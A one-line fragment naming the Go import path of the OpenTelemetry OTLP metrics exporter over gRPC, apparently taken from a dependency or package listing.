go.opentelemetry.io/otel/exporters/otlp/otlpmetric/otlpmetricgrpc
```
